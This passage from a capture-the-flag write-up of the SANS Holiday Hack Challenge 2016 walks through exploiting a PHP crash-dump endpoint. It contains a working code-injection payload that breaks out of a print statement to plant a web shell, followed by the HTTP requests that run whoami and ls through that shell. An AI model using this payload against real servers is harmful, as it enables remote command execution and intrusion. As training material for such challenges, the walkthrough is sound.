&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt; &lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="nv"&gt;$obj&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;operation&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="k"&gt;or&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="nv"&gt;$obj&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;operation&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;!==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;WriteCrashDump&amp;quot;&lt;/span&gt; &lt;span class="k"&gt;and&lt;/span&gt;
    &lt;span class="nv"&gt;$obj&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;operation&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;!==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ReadCrashDump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Fatal error! JSON key &amp;#39;operation&amp;#39; must be set to WriteCrashDump or ReadCrashDump.&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$obj&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;data&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$obj&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;operation&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;WriteCrashDump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="c1"&gt;# Write a new crash dump to disk&lt;/span&gt;
        &lt;span class="nx"&gt;processCrashDump&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$obj&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;data&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;elseif&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$obj&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;operation&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ReadCrashDump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="c1"&gt;# Read a crash dump back from disk&lt;/span&gt;
        &lt;span class="nx"&gt;readCrashdump&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$obj&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;data&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="c1"&gt;# data key unset&lt;/span&gt;
    &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Fatal error! JSON key &amp;#39;data&amp;#39; must be set.&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;processCrashdump&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$crashdump&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;$basepath&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/var/www/html/docs/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nv"&gt;$outputfilename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;tempnam&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$basepath&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;crashdump-&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nb"&gt;unlink&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$outputfilename&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="nv"&gt;$outputfilename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$outputfilename&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;.php&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nv"&gt;$basename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;basename&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$outputfilename&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="hll"&gt;    &lt;span class="nv"&gt;$crashdump_encoded&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;?php print(&amp;#39;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nb"&gt;json_encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$crashdump&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;JSON_PRETTY_PRINT&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;#39;);&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;    &lt;span class="nb"&gt;file_put_contents&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$outputfilename&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$crashdump_encoded&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;lt;&amp;lt;&amp;lt;END&lt;/span&gt;
&lt;span class="s"&gt;{&lt;/span&gt;
&lt;span class="s"&gt;    &amp;quot;success&amp;quot; : true,&lt;/span&gt;
&lt;span class="s"&gt;    &amp;quot;folder&amp;quot; : &amp;quot;docs&amp;quot;,&lt;/span&gt;
&lt;span class="s"&gt;    &amp;quot;crashdump&amp;quot; : &amp;quot;$basename&amp;quot;&lt;/span&gt;
&lt;span class="s"&gt;}&lt;/span&gt;

&lt;span class="s"&gt;END;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;readCrashdump&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$requestedCrashdump&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;$basepath&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/var/www/html/docs/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nb"&gt;chdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$basepath&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt; &lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$requestedCrashdump&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;crashdump&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Fatal error! JSON key &amp;#39;crashdump&amp;#39; must be set.&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="nb"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;strrchr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$requestedCrashdump&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;crashdump&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;php&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Fatal error! crashdump value duplicate &amp;#39;.php&amp;#39; extension detected.&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$requestedCrashdump&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;crashdump&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;.php&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now that I'm pasting this source code, I see that the audio file path is given
in the top comment of the file. But I was so eager to find out how
&lt;code&gt;WriteCrashDump&lt;/code&gt; and &lt;code&gt;ReadCrashDump&lt;/code&gt; work that I didn't see it.
Woopsie for me! Ok, bear with me, and let's suppose that the audio file was not
given in the comment (plus, it's more fun this way, so there!).&lt;/p&gt;
&lt;p&gt;When we call &lt;code&gt;WriteCrashDump&lt;/code&gt;, we can see that our data are JSON encoded,
surrounded by &lt;code&gt;print('&lt;/code&gt; and &lt;code&gt;');&lt;/code&gt;, then stored in a PHP file.
Since JSON encoding does not encode single-quote, we can escape from our
&lt;code&gt;print&lt;/code&gt; statement:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;POST&lt;/span&gt; &lt;span class="nn"&gt;/exception.php&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ex.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;309&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;operation&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;WriteCrashDump&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:{&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; &amp;#39;);system($_GET[&amp;#39;c&amp;#39;]);die();print(&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;lmessage&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;strace&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;model&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;sdkint&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;device&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;product&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;lversion&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;vmheapsz&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;vmallocmem&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;vmheapszlimit&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;natallocmem&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;cpuusage&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;totalstor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;freestor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;busystor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;&amp;quot;udid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 29 Dec 2016 16:01:28 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;81&lt;/span&gt;

{
    &amp;quot;success&amp;quot; : true,
    &amp;quot;folder&amp;quot; : &amp;quot;docs&amp;quot;,
    &amp;quot;crashdump&amp;quot; : &amp;quot;crashdump-F4Xkdl.php&amp;quot;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We now have a functional webshell, stored in the &lt;code&gt;crashdump-F4Xkdl.php&lt;/code&gt;
file. We just have to put our wanted command in the &lt;code&gt;GET&lt;/code&gt; parameter
&lt;code&gt;c&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="hll"&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/docs/crashdump-F4Xkdl.php?c=whoami&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;/span&gt;&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ex.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 29 Dec 2016 16:03:01 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;28&lt;/span&gt;

{
&lt;span class="hll"&gt;    &amp;quot;message&amp;quot;: &amp;quot; www-data
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Yes, our command was executed properly. We can now list the content of the
webroot:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="hll"&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/docs/crashdump-F4Xkdl.php?c=ls+-lh+../&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;/span&gt;&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/json&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;ex.northpolewonderland.com&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;gzip&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.2&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 29 Dec 2016 16:04:14 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;237&lt;/span&gt;

{
    &amp;quot;message&amp;quot;: &amp;quot; total 352K
&lt;span class="hll"&gt;-rw-r--r-- 1 jeff     jeff     219K Dec  7 17:08 discombobulated-audio-6-XyzE3N9YqKNH.mp3
&lt;/span&gt;drwxr-xr-x 2 www-data www-data 124K Dec 29 16:01 docs
-r--r--r-- 1 www-data www-data 2.4K Dec  7 16:58 exception.php
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We now have the name of the audio file, without having to rely on the comment
in the &lt;code&gt;exception.php&lt;/code&gt; file, we're such haXXorz. Anyway, the URL to the
audio file is: &lt;a class="reference external" href="http://ex.northpolewonderland.com/discombobulated-audio-6-XyzE3N9YqKNH.mp3"&gt;http://ex.northpolewonderland.com/discombobulated-audio-6-XyzE3N9YqKNH.mp3&lt;/a&gt;&lt;/p&gt;
&lt;img alt="ex_audio_result.png" class="align-center" src="/images/sans-christmas-challenge-2016/ex_audio_result.png" /&gt;
&lt;/div&gt;
&lt;div class="section" id="the-mobile-analytics-server-post-authentication"&gt;
&lt;h3&gt;&lt;a class="reference external" href="https://analytics.northpolewonderland.com/"&gt;The Mobile Analytics Server (post authentication)&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;We may have found the first audio file in the analytics server by logging in,
but we haven't taken a look at the functionalities offered by the server.
Basically, we can query some usage information of the Android application,
and save these queries:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;First, we performed a query, that we save:&lt;/li&gt;
&lt;/ul&gt;
&lt;img alt="analytics_guest_query.png" class="align-center" src="/images/sans-christmas-challenge-2016/analytics_guest_query.png" /&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Then, we get the result of our query:&lt;/li&gt;
&lt;/ul&gt;
&lt;img alt="analytics_guest_query_result.png" class="align-center" src="/images/sans-christmas-challenge-2016/analytics_guest_query_result.png" /&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;We can then consult the result of our saved query:&lt;/li&gt;
&lt;/ul&gt;
&lt;img alt="analytics_guest_query_saved.png" class="align-center" src="/images/sans-christmas-challenge-2016/analytics_guest_query_saved.png" /&gt;
&lt;p&gt;Playing with the different parameters to conduct usual attacks (SQLi, LFI,
etc.) didn't lead to anything. On the suggestion of one of the elves, we can
use &lt;code&gt;nmap -sC&lt;/code&gt; to find interesting files hosted by the web server:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;nmap -sC analytics.northpolewonderland.com
Starting Nmap 6.47 &lt;span class="o"&gt;(&lt;/span&gt; http://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at 2016-12-26 11:52 CET
Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; analytics.northpolewonderland.com &lt;span class="o"&gt;(&lt;/span&gt;104.198.252.157&lt;span class="o"&gt;)&lt;/span&gt;
